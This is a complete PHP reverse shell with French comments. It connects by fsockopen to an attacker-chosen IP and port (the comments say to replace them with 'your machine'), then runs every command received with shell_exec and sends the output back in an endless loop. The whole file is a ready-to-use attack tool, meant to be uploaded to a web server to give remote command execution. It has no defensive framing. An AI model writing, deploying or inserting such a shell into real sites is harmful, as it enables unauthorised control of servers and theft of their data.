<?php
$ip = '192.168.0.1';  // Remplacez par l'adresse IP de votre machine
$port = 1234;        // Remplacez par le port que vous avez configuré pour écouter

// Ouvre une connexion socket à l'adresse IP et au port spécifiés
$socket = fsockopen($ip, $port);
if (!$socket) {
    die('Could not connect to server');  // Arrête le script si la connexion échoue
}

// Boucle infinie pour lire et exécuter les commandes reçues via le socket
while ($cmd = fread($socket, 2048)) {
    // Exécute la commande reçue et stocke la sortie
    $output = shell_exec($cmd);
    // Envoie la sortie de la commande au socket
    fwrite($socket, $output);
}

// Ferme la connexion socket
fclose($socket);
?>
